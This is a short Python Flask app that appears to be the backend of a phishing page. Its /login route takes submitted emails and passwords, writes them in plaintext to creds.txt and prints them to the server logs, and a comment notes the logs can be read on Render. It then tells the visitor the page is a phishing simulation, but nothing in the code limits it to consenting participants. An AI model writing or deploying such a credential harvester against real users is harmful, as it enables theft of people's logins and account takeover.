from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    
    # Write to file (optional)
    with open("creds.txt", "a") as f:
        f.write(f"Email: {email}, Password: {password}\n")
    
    # Print to logs so you can see on Render
    print(f"Email: {email}, Password: {password}")

    return "This is a phishing simulation. Credentials logged for training only."

if __name__ == "__main__":
    app.run()
